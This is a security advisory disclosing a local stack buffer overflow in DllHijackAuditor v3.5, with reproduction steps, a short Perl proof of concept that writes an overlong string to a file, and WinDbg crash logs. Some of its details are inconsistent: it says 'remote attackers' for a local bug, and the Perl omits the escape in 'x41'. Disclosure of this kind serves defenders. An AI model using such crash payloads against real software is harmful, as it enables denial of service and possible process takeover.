================================
A local stack buffer overflow vulnerability has been discovered in the official DllHijackAuditor v3.5 software.
The overflow vulnerability allows remote attackers to take-over the process by overwrite of the active registers.

The stack buffer overflow vulnerability is located in the `Specify Extension Entry` module of the software. Local attackers are 
able to include unicode as malicious payload to crash software via stack overflow. Thus allows the local attacker to 
overwrite for example the eip register to take control of the vulnerable software process. 

The security risk of the issue is estimated as high with a cvss (common vulnerability scoring system) count of 6.1. 
Exploitation of the vulnerability requires a low privilege or restricted system user account without user interaction. 
Successful exploitation of the vulnerability results in computer system manipulation and compromise of the computer system.

Vulnerable Input(s):
           [+] Specify Extension - (Entry)


Proof of Concept (PoC):
=======================
A local stack overflow vulnerability can be exploited by local attackers without user interaction and with privileged system user account.
For security demonstration or to reproduce the sofwtare vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1. Launch the DllHijackAuditors.exe software process
2. Run the code in perl and a file format (.txt) will create
3. Copy  the AAAAAAAAA+... string from DllHijackAuditor.txt to clipboard
4. Paste it to the input Specify Extension AAAAAAAAA+... string and click `Start Audit` to process
5. Software crash permanently by a stack overflow
6. Successfully reproduce of the local stack buffer overflow vulnerability!


PoC: Exploit Code (Perl)
#!/usr/bin/perl
my $Buff = "x41" x 3000;
open(MYFILE,'>>DllHijackAuditor.txt');
print MYFILE $Buff;
close(MYFILE);
print " POC Created by ZwXn";


--- PoC Debug Session Logs [WinDBG] ---
Stack buffer overflow - code c0000409 (!!! second chance !!!)
eax=00000001 ebx=0059c60c ecx=00000005 edx=773913f0 esi=0766fc7c edi=0014d2c0
eip=00529e5b esp=0766f5b8 ebp=0766f5d0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
DllHijackAuditor+0x129e5b:
00529e5b cd29            int     29h

EXCEPTION_RECORD:  ffffffff -- (.exr ffffffffffffffff)
ExceptionAddress: 00529e5b (DllHijackAuditor+0x00129e5b)
   ExceptionCode: c0000409 (Stack buffer overflow)
   ExceptionFlags: 00000001
NumberParameters: 1
   Parameter[0]: 00000005

FAULTING_THREAD:  00000754
BUGCHECK_STR:  STACK_OVERRUN
PROCESS_NAME:  DllHijackAuditor.exe
FAULTING_MODULE: 77300000 ntdll
DEBUG_FLR_IMAGE_TIMESTAMP:  534bb17f
DEFAULT_BUCKET_ID:  WRONG_SYMBOLS
LAST_CONTROL_TRANSFER:  from 00529e49 to 00529e5b

0:004> d esi
0766fc7c  00 3a 5c 55 73 65 72 73-5c 5a 77 58 5c 41 70 70  .:\Users\ZwX\App
0766fc8c  44 61 74 61 5c 4c 6f 63-61 6c 5c 54 65 6d 70 5c  Data\Local\Temp\
0766fc9c  44 6c 6c 48 69 6a 61 63-6b 41 75 64 69 74 5f 41  DllHijackAudit_A
0766fcac  70 70 43 72 61 73 68 56-69 65 77 2e 65 78 65 5f  ppCrashView.exe_
0766fcbc  32 30 30 34 37 33 35 35-33 36 5c 74 65 73 74 2e  2004735536\test.
0766fccc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fcdc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fcec  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:004> d 0766fcec
0766fcec  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fcfc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd0c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd1c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd2c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd3c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd4c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0766fd5c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA


[+] Disclaimer [+]
===================
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.


Domain:     www.zwx.fr
Contact:    msk4@live.fr	
Social:     twitter.com/XSSed.fr
Feeds:      www.zwx.fr/feed/
Advisory:   www.vulnerability-lab.com/show.php?user=ZwX
            packetstormsecurity.com/files/author/12026/
            cxsecurity.com/search/author/DESC/AND/FIND/0/10/ZwX/
            0day.today/author/27461


